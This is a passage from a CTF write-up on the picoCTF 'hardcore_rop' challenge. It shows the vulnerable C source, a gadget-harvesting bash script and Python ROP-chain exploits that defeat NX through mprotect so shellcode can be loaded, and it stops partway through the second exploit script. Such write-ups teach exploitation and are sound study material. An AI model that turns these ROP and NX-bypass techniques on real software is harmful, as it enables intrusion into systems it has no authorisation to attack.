</span><span class='line'>  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="n">seed</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAPLEN</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">66</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;ROP time!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">x</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">do</span> <span class="n">x</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="n">count</span><span class="p">,</span> <span class="mi">555</span><span class="o">-</span><span class="n">count</span><span class="p">);</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">count</span> <span class="o">+=</span> <span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">555</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)[</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">chdir</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">stat</span><span class="p">(</span><span class="s">&quot;./flag&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;oops, problem set up wrong D:&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;yo, what&#39;s up?&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">alarm</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>      <span class="n">randop</span><span class="p">();</span>
</span><span class='line'>      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0F000000</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="n">seed</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAPLEN</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">66</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">MAPLEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">size_t</span> <span class="n">x</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">do</span> <span class="n">x</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="n">count</span><span class="p">,</span> <span class="mi">555</span><span class="o">-</span><span class="n">count</span><span class="p">);</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">count</span> <span class="o">+=</span> <span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">555</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">)[</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span><span class="o">(</span><span class="nb">echo </span>7777<span class="p">;</span> python -c <span class="s1">&#39;print &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&quot;&#39;</span><span class="o">)</span> <span class="p">|</span> ./hardcore_rop <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</span><span class='line'>yo, what<span class="s1">&#39;s up?</span>
</span><span class='line'><span class="s1">ROP time!</span>
</span><span class='line'><span class="s1">Segmentation fault (core dumped)</span>
</span><span class='line'><span class="s1">bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core</span>
</span><span class='line'><span class="s1">GNU gdb (GDB) 7.4.1-debian</span>
</span><span class='line'><span class="s1">...</span>
</span><span class='line'><span class="s1">Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>

<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">read </span>i<span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  <span class="o">(</span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&quot;</span><span class="o">)</span> <span class="p">|</span> ./hardcore_rop <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</span><span class='line'>  dd <span class="k">if</span><span class="o">=</span>core <span class="nv">of</span><span class="o">=</span>region <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">4096</span> <span class="nv">count</span><span class="o">=</span>40960
</span><span class='line'>  xxd -c <span class="m">1</span> region <span class="p">|</span> awk <span class="o">{</span><span class="s1">&#39;print $1 $2&#39;</span><span class="o">}</span> <span class="p">|</span>sort -r &gt; dump.txt
</span><span class='line'>  python ./ropgadget.py -i bleh -d <span class="m">10</span> &gt; <span class="nv">$i</span>-gadgets.txt
</span><span class='line'>
</span><span class='line'>  cat <span class="nv">$i</span>-gadgets.txt <span class="p">|</span>egrep <span class="s1">&#39;int 0x80&#39;</span>
</span><span class='line'>  rm core
</span><span class='line'>  rm dump.txt
</span><span class='line'><span class="k">done</span> &lt; digits.txt
</span></code></pre></td></tr></table></div></figure>


<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span>grep <span class="s2">&quot;int 0x80&quot;</span> *
</span><span class='line'>0347-gadgets.txt:RET: 0x0000d64: int 0x80<span class="p">;</span> lahf<span class="p">;</span> ret<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># RET: 0x000913f: pop eax; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0003c7e: pop ecx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0002393: pop edx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x000964d: pop ebx; ret;</span>
</span><span class='line'><span class="c"># RET: 0x0000d64: int 0x80; lahf; ret;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I wrote the following ROP chain:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">BASE</span> <span class="o">=</span> <span class="mh">0xf000000</span>
</span><span class='line'><span class="c"># RET: 0x000913f: pop eax; ret;</span>
</span><span class='line'><span class="n">popeax</span> <span class="o">=</span> <span class="mh">0x000913f</span>
</span><span class='line'><span class="c"># RET: 0x0003c7e: pop ecx; ret;</span>
</span><span class='line'><span class="n">popecx</span> <span class="o">=</span> <span class="mh">0x0003c7e</span>
</span><span class='line'><span class="c"># RET: 0x0002393: pop edx; ret;</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="mh">0x0002393</span>
</span><span class='line'><span class="c"># RET: 0x000964d: pop ebx; ret;</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="mh">0x000964d</span>
</span><span class='line'><span class="c"># RET: 0x0000569: pop edi; ret;</span>
</span><span class='line'><span class="n">popedi</span> <span class="o">=</span> <span class="mh">0x0000569</span>
</span><span class='line'><span class="c"># RET: 0x0000d64: int 0x80; lahf; ret;</span>
</span><span class='line'><span class="n">int80h</span> <span class="o">=</span> <span class="mh">0x0000d64</span>
</span><span class='line'><span class="c"># RET: 0x0001b11: int3; ret;</span>
</span><span class='line'><span class="n">int03h</span> <span class="o">=</span> <span class="mh">0x0001b11</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># seed value</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;0347</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># syscall number 125 in eax (mprotect)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">125</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to memory region in ebx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># memory flags PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># length in ecx, needs to be multiple of 2</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># stage2 test</span>
</span><span class='line'><span class="c"># edi = 0xf000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedi</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># edx = 0xcccccccc (four times int 0x3)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xcccccccc</span><span class="p">)</span>
</span><span class='line'><span class="c"># RET: 0x0002770: mov [edi], dh; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="mh">0x0002770</span><span class="p">)</span>
</span><span class='line'><span class="c"># return to 0xf000000, which should contain an int 0x3</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span><span class='line'><span class="c">## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>

<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">BASE</span> <span class="o">=</span> <span class="mh">0xf000000</span>
</span><span class='line'><span class="n">popeax</span> <span class="o">=</span> <span class="mh">0x000913f</span>
</span><span class='line'><span class="n">popecx</span> <span class="o">=</span> <span class="mh">0x0003c7e</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="mh">0x0002393</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="mh">0x000964d</span>
</span><span class='line'><span class="n">popedi</span> <span class="o">=</span> <span class="mh">0x0000569</span>
</span><span class='line'><span class="n">int80h</span> <span class="o">=</span> <span class="mh">0x0000d64</span>
</span><span class='line'><span class="n">int03h</span> <span class="o">=</span> <span class="mh">0x0001b11</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># seed value</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;0347</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow buffer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># eax = syscall_mprotect</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popeax</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">125</span><span class="p">)</span>
